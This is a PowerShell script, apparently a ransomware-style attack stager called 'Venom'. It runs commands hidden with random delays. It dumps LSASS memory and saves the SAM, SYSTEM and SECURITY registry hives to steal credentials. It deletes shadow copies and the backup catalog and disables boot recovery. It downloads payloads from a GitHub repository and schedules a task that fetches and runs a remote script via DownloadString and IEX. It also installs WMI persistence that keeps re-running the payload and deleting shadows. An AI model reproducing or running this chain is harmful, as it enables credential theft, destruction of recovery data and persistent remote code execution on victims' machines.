
#Functions
function Invoke-CommandArray {
    param(
        [Parameter(Mandatory = $true)]
        [string[]] $Commands,

        [Parameter(Mandatory = $false)]
        [string] $LogFile = "c:\venom\pamper_log.txt",

        [switch] $Csv
    )

    # If a logfile was provided, ensure the directory exists
    if ($LogFile) {
        $logDir = Split-Path $LogFile -Parent
        if (-not (Test-Path $logDir)) {
            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        }

        # Create file if missing
        if (-not (Test-Path $LogFile)) {
            "Timestamp,PID,Command" | Out-File -FilePath $LogFile -Encoding UTF8
        }
    }

    foreach ($cmd in $Commands) {

        if ([string]::IsNullOrWhiteSpace($cmd)) {
            Write-Host "Skipping empty command entry..."
            continue
        }

        Write-Host "Executing: $cmd"

        try {
            # Start the process safely with proper quoting
            $process = Start-Process powershell.exe -ArgumentList @(
			    "-NoProfile"
			    "-Command"
			    $cmd
			) -PassThru -Wait -ErrorAction Stop -WindowStyle Hidden

            $proc_pid = $process.Id
        }
        catch {
            Write-Warning "Command failed: $cmd"
            Write-Warning $_
            $proc_pid = "ERROR"
        }

        # Log the execution
        if ($LogFile) {
            $timestamp = (Get-Date).ToString("o")  # ISO 8601
            
            $escapedCmd = $cmd.Replace('"','`"')   # CSV-safe double quotes
            Add-Content -Path $LogFile -Value "[$timestamp] PID=$proc_pid | $cmd"
            if ($Csv) {
                $csvFile = "$(Split-Path $LogFile -Parent)" + "\pamper_log.csv"
                "$timestamp,$pid,`"$escapedCmd`"" | Out-File -FilePath $csvFile -Append -Encoding UTF8
            }
            
        }

        # Jitter delay
        $delay = Get-Random -Minimum 5 -Maximum 15
        Write-Host "Sleeping for $delay seconds..."
        Start-Sleep -Seconds $delay
    }
}


$cred_commands = @('$sassy_pid = Get-Process lsass | Select Id -ExpandProperty Id; c:\windows\system32\rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump $sassy_pid c:\venom\lsass.dmp full',
	'Get-Process lsass | ForEach-Object {$proc = [System.Diagnostics.Process]::GetProcessById($_.Id); $dumpFile="C:\venom\lsass.dmp"',
	'c:\windows\system32\reg.exe save HKLM\SAM c:\venom\sam.save',
	'c:\windows\system32\reg.exe save HKLM\SYSTEM c:\venom\system.save',
	'c:\windows\system32\reg.exe save HKLM\SECURITY c:\venom\security.save')

$cripple_commands = @('cmd.exe /c vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB',
	'cmd.exe /c vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded',
	'cmd.exe /c vssadmin delete shadows /all /quiet',
	'cmd.exe /c wmic shadowcopy delete',
	'cmd.exe /c bcedit /set {current} recoveryenabled No',
    'cmd.exe /c bcedit /set {default} recoveryenabled No'
	'cmd.exe /c wbadmin delete catalog -quiet')

Invoke-CommandArray -Commands $cred_commands -Csv
Start-Sleep 5
Invoke-CommandArray -Commands $cripple_commands -Csv
#$scheduledTaskCreator = $PSScriptRoot + '\sc.exe'
$scheduledTaskCreator = "c:\venom\sc.exe"
$pamperlog = "c:\venom\pamper_log.txt"
$timestamp = (Get-Date).ToString("o")
try {
    Invoke-WebRequest -Uri	'https://github.com/theblueshadow48/running-deploy/raw/refs/heads/main/it_support.zip' -out c:\venom\it_support.zip
    Add-Content -Path $pamperlog -Value "[$timestamp] DOWNLOAD | Successfully downloaded main package."
}
catch {
    Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to download main package."
    try {
        Invoke-WebRequest -Uri	'https://github.com/theblueshadow48/running-deploy/raw/refs/heads/main/sc.exe' -out $scheduledTaskCreator
        Add-Content -Path $pamperlog -Value "[$timestamp] DOWNLOAD | Successfully downloaded scheduled task creator."
    }
    catch {
        Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to download scheduled task creator."
    }
}
if (Test-Path "C:\venom\it_support.zip") {
    Expand-Archive -Path "c:\venom\it_support.zip" -DestinationPath "c:\venom" -Force
    Add-Content -Path $pamperlog -Value "[$timestamp] UNZIP | Successfully unzipped Venom package."

}
#Write-Host $scheduledTaskCreator
$scheduledCommand = "$scheduledTaskCreator create SystemHealthCheckTask powershell.exe `"-ep Bypass -c (New-object Net.WebClient).DownloadString('https://raw.gi'+'thubusercontent.com/theblueshadow48/running-deploy/refs/heads/main/venom.ps1')|IEX;`""
if (Test-Path $scheduledTaskCreator) {
    Write-Host $scheduledTaskCreator
    try {
        Start-Process cmd.exe -ArgumentList "/c", $scheduledCommand -WindowStyle Hidden
        Add-Content -Path $pamperlog -Value "[$timestamp] TASK | Successfully scheduled Venom persistence."
    }
    catch {
        Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to schedule Venom persistence."
    }
}
<#
try {
    Invoke-WebRequest -Uri	'https://github.com/theblueshadow48/running-deploy/raw/refs/heads/main/venom.ps1' -out c:\venom\venom.ps1
    Add-Content -Path $pamperlog -Value "[$timestamp] DOWNLOAD | Successfully downloaded Venom Script."
}
catch {
    Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to download scheduled task creator."
}
#>

$powershell_proc = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$constrict_path = "c:\venom\constrict.ps1"
try {
    Unblock-File $constrict_path
    Start-Process $powershell_proc -ArgumentList @("-ExecutionPolicy Bypass -nop $constrict_path") -WindowStyle Hidden
    Add-Content -Path $pamperlog -Value "[$timestamp] EXECUTE | Successfully executed constriction"
}
catch {
    Unblock-File "c:\venom\wiggle_worm.ps1"
    . "c:\venom\wiggle_worm.ps1"
    Install-WMISubscription -Name "JawLock" -Command "powershell -NoProfile -ExecutionPolicy Bypass -File 'c:\venom\venom.ps1'" -IntervalSeconds 600
    Install-WMISubscription -Name "NoWayOut" -Command "cmd.exe /c vssadmin delete shadows /all /quiet" -IntervalSeconds 900
    Add-Content -Path $pamperlog -Value "[$timestamp] EXECUTE-2 | Fell Back to Wiggle Worm Constriction"
}
try {
    Unblock-File c:\venom\venom.ps1
    Start-Process $powershell_proc -ArgumentList @("-ExecutionPolicy Bypass -nop c:\venom\venom.ps1") -WindowStyle Hidden
    Add-Content -Path $pamperlog -Value "[$timestamp] EXECUTE | Successfully executed venom"
}
catch {
    Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to execute venom"
}  
